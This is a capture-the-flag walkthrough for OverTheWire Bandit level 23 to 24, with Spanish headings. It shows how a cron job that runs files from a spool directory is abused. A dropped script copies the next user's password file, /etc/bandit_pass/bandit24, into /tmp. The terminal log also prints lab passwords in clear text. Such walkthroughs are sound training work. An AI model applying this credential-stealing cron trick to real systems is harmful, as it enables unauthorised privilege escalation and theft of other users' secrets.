# Level 23-24

## Objetivo
A program is running automatically at regular intervals from **cron**, the time-based job scheduler. Look in **/etc/cron.d/** for the configuration and see what command is being executed.
## Datos de Acceso
ssh bandit23@bandit.labs.overthewire.org -p 2220
QYw0Y2aiA672PsMmh9puTQuhoz8SyR2G
## Solución
``` bash
C:\WINDOWS\system32>ssh bandit23@bandit.labs.overthewire.org -p 2220
                         _                     _ _ _
                        | |__   __ _ _ __   __| (_) |_
                        | '_ \ / _` | '_ \ / _` | | __|
                        | |_) | (_| | | | | (_| | | |_
                        |_.__/ \__,_|_| |_|\__,_|_|\__|


                      This is an OverTheWire game server.
            More information on http://www.overthewire.org/wargames

bandit23@bandit.labs.overthewire.org's password:
bandit23@bandit:~$ ls /etc/cron.d
cronjob_bandit15_root  cronjob_bandit23       e2scrub_all
cronjob_bandit17_root  cronjob_bandit24       otw-tmp-dir
cronjob_bandit22       cronjob_bandit25_root  sysstat
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done

bandit23@bandit:~$ mkdir /tmp/lol
bandit23@bandit:~$ cd /tmp/lol
bandit23@bandit:/tmp/lol$ echo "cat /etc/bandit_pass/bandit24 >/tmp/lol/password" > script.sh
bandit23@bandit:/tmp/lol$ cat script.sh 
cat /etc/bandit_pass/bandit24 >/tmp/lol/password
bandit23@bandit:/tmp/lol$ chmod +x script.sh 
bandit23@bandit:/tmp/lol$ touch password 
bandit23@bandit:/tmp/lol$ chmod 666 password 
bandit23@bandit:/tmp/lol$ ls -la
total 112
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 14:41 .
drwxrwx-wt 2787 root     root     106496 Feb 28 14:44 ..
-rw-rw-rw-    1 bandit23 bandit23      0 Feb 28 14:44 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 14:43 script.sh
bandit23@bandit:/tmp/lol$ cp script.sh  /var/spool/bandit24/foo
bandit23@bandit:/tmp/lol$ ls -la
total 112
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 14:41 .
drwxrwx-wt 2787 root     root     106496 Feb 28 14:44 ..
-rw-rw-rw-    1 bandit23 bandit23      0 Feb 28 14:44 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 14:43 script.sh
bandit23@bandit:/tmp/lol$ date
Tue Feb 28 02:44:51 PM UTC 2023
bandit23@bandit:/tmp/lol$ ls -la
total 116
drwxrwxr-x    2 bandit23 bandit23   4096 Feb 28 14:41 .
drwxrwx-wt 2787 root     root     106496 Feb 28 14:45 ..
-rw-rw-rw-    1 bandit23 bandit23     33 Feb 28 14:45 password
-rwxrwxr-x    1 bandit23 bandit23     49 Feb 28 14:43 script.sh
bandit23@bandit:/tmp/lol$ cat password 
VAfGXJ1PBSsPSnvsjI8p759leLZ9GGar
```
## Notas Adicionales

## Referencias

